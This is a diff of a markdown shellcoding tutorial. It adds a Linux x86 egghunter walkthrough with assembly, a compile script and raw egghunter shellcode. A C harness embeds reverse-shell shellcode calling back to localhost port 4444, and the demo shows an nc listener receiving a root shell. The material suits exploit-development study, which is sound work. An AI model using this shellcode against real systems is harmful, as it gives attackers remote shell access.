@@ -950,7 +950,7 @@ If you didn't you do now!
 For your own sake, make sure you read over it and fully understand it. It'll help you to understand how it works on a fundamental level.
 
 
-## Testing our bind shell
+## Testing our reverse shell
 
 So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.
 
@@ -1050,7 +1050,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-I hope you enjoyed learning how to create a simple shell-bind-tcp using shellcode!
+I hope you enjoyed learning how to create a simple shell-reverse-tcp using shellcode!
 
 As an added bonus, I've included a python script that allows you to dynamically restructure shellcode to allow for the swapping of IP's and ports.
 
@@ -1105,12 +1105,21 @@ Port is:
 - Create a working egghunter demo
 - Make demo configurable for different payloads
 
+## Prerequisites
+
+- Basic understanding of registers
+- Basic understanding of stack and memory
+- Basic understanding of assembly
+
+
 ## Context
 
 What is an egghunter?
 
 Well an egghunter is staged shellcode we use to find larger space in the memory for storing our shellcode. An egghunter must be a very small piece of code and very fast, because searching in a process' Virtual Address Space (VAS) is very CPU consuming. In an egghunter you store a short 4 byte string which must be found in memory twice (avoiding colision with egghunter itself). There are a few ways we can achieve this.
-## The Challenge of Interacting With VAS
+
+
+## The challenge of interacting With VAS
 
 If you remember, we're trying to read memory addresses in process-relative VAS. 
 
@@ -1120,30 +1129,205 @@ Dereferencing this unallocated memory could lead to a host of bad things, most p
 
 So how do we work arround this?
 
-## Access(2) Syscall
 
-In this assignment we will use the syscall "access(2)" to achieve this.
+## Approach
 
-Why access(2)?
+There are dozens are a few ways we could implement this.
 
-Well a feature of a Linux syscall is the ability to validate process-relative memory addresses without leading to a segmentation fault or other runtime error in the program itself. 
-When asystem call encounters an invalid memory address, most will return the EFAULT  rror code to indicate that a pointer provided to the system call was not valid.
+For my egg hunter, I decided to make something simple and easy to create. The egg hunter will iterate through memory addresses, and compare the value at that memory address to the provided egg. If the value matches the egg, the egg hunter will jump to that memory space and execute the second stage of the shellcode payload.
+
+The memory of the application would look something like <egg hunter><random memory><egg><second stage shellcode><random memory>. The egg hunter will keep searching through memory until the egg is found, and then jump to the second stage and execute.
+	
+## Syscalls
+
+A feature of the Linux syscall is the ability to validate process-relative memory addresses without leading to a segmentation fault or other runtime error in the program itself. 
+When a syscall encounters an invalid memory address, it will return an EFAULT error code to indicate that a pointer provided to the system call was not valid.
 ```
 root@ubuntu:/home/ubuntu# errno 6
 ENXIO		 6	/* No such device or address */
 ```
 
-Fortunately for the egg hunter, this is the exact type of information it needs
-in order to safely traverse the process’ VAS without dereferencing the invalid
-memory regions that are strewn about the process
+Fortunately for the egg hunter, this is the exact type of information it needs in order to safely traverse the process’ VAS without dereferencing the invalid memory regions that are strewn about the process.
 
-## Prerequisites
+To achieve this, we'll use the access(2) syscall.
 
-- Basic understanding of registers
-- Basic understanding of stack and memory
-- Basic understanding of assembly
+```
+global _start
+
+section .text
+
+_start:
+	; We will EDX to track the memory we're searching
+	xor edx,edx	; clear it in preparation
+
+init_page:
+	; Initializing EDX register to PAGE_SIZE(0x1000) which is 4096 bytes
+	or dx,0xfff
+
+inc_page:
+	
+	; inc on every loop to access() all possible VAS memory
+	inc edx
+
+sys_access:	
+	; load the latest 8 bytes of EDX into EBX so we can find our 8 byte egg in the target process' VAS
+	lea ebx,[edx+0x4]
+	push byte +0x21	; push access() syscall onto stack
+	pop eax		; set EAX to access(). push pop saves 1 byte over: xor eax,eax; mov al,0x21.
+	
+	; [*] Calling access(ebx[edx+0x4])
+	int 0x80
+
+	; [+] Check for error code 
+	; EFAULT returns error code if access() address was invalid. 
+	; EFAULTs error code low byte is 0xf2
+	cmp al,0xf2	; checks return of syscall against return value, if error code: set ZF=1 
+
+access_failure:	
+	; [+] On access() failure
+	jz init_page	; EFAULT error code (ZF=1) so loop up, inc edx and try again.
+
+access_success:
+	; [+] On access() success
+	; [!] Our egg is 0x50905090. In this code its moved into EAX in reverse so it appears as 0x905090. 
+	; [!] When hunting for the egg make sure to hunt for: 0x50905090.
+	mov eax,0x90509050	; move our egg ((push eax,nop)*4) into EAX to search it
+	mov edi,edx		; move value EDX into EDI (valid access() address)
+	scasd			; scasd will compare EAX and EDI. If equal then ZF=1, else not equal ZF=0. scasd matching first 4 bytes
+				; scasd auto increments EDI by dword (4 bytes) if DF=0. Because we have not set it DF, after execution EDI is now edi+0x4
+	jnz inc_page		; If ZF=0 loop up, else if ZF=1 continue down
+
+	scasd			; scasd auto increments so now its comparing edi+0x4. scasd matching second 4 to confirm
+	jnz inc_page		; if no egg match then loop up and try again
+
+egghunted:	
+	; [+] On match
+	; if scasd returns a match (ZF=1) then jump to our shellcode in EDI (that was auto incremented each time with scasd match)
+	jmp edi			;
+```
+
+## Compiling our egghunter
+
+So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.
+
+During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
+```
+# This compiles your assembly code and dumps the shellcode 
+
+# Compile and output
+nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o
+
+# Gets shellcode from output file
+
+## Prints the shellcode in little endian
+
+RAW=$(objdump -d "$1" | grep "^ "|awk -F"[\t]" '{print $2}')
+SHELLCODE=""
+COUNT=0
+for word in $RAW
+do
+	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
+	((COUNT++))
+done
+echo ""
+echo "Shellcode: "
+echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
+echo "Shellcode size: ${COUNT} bytes"
+```
+
+You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile and like it like so:
+```
+root@ubuntu:/mnt/hgfs/assembly/exam/3-Assignment# ./compile-shell-dump.sh egghunter
+
+Shellcode: 
+\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x50\x90\x50\x90\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7
+Shellcode size: 35 bytes
+```
+
+If you remember, our egghunter will locate the egg in memory and execute the shellcode after it.
+
+The structure for that was: 
+- <egg hunter><random memory><egg><second stage shellcode><random memory.
+
+To test this, we'll be using a reverse shell in this demonstartion. The structe should look like this:
+- <egg hunter><random memory><egg><reverse shell><random memory
+
+Knowing this we'll take the dumped shellcode and place it in the following C file that holds our reverse shell, we do this to confirm it works in a C program.
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define EGG "\x50\x90\x50\x90"
+
+unsigned char egghunter[] = \
+"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x50\x90\x50\x90\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
 
 
-## Approach
+unsigned char shellcode[] = \
+EGG
+EGG
+"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x1\x1\x2\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
 
-There are dozens of approaches you
+
+main()
+{
+    int shellcode_len = strlen(shellcode);
+    printf("Egghunter Length:  %d\n", strlen(egghunter));
+    printf("Shellcode Length:  %d\n", shellcode_len);
+
+    // Create a buffer to place our shellcode
+    char *badbuffer;
+    badbuffer=malloc(shellcode_len);
+    memcpy(badbuffer,shellcode,shellcode_len);
+
+	int (*ret)() = (int(*)())egghunter;
+	ret();
+
+    free(badbuffer);
+
+}
+```
+
+Once that's done we're going to need to compile it:
+```
+root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
+```
+
+And we're done!
+
+## Testing our egghunter
+
+To test our egghunter open a new terminal and enter the following command.
+
+This shell command will open a TCP socket connection on the specified port.
+
+```
+nc -v -l 4444
+```
+
+The terminal will hang in a listeneing state until it receives a connection on that port.
+
+
+Now in a separate terminal let's run our compiled shellcode!
+
+```
+root@ubuntu:/mnt/hgfs/assembly/exam/3-Assignment/testShellcode# ./testingShellcode
+Egghunter Length:  35
+Shellcode Length:  104
+
+```
+
+It should hang like our previous command, but if we go back to our listener...
+
+You can see we have a shell!
+
+```
+root@ubuntu:/home/ubuntu# nc -v -l 4444
+Connection from 127.0.0.1 port 4444 [tcp/*] accepted
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+I hope you enjoyed learning about egghunters and implementing them using shellcode!
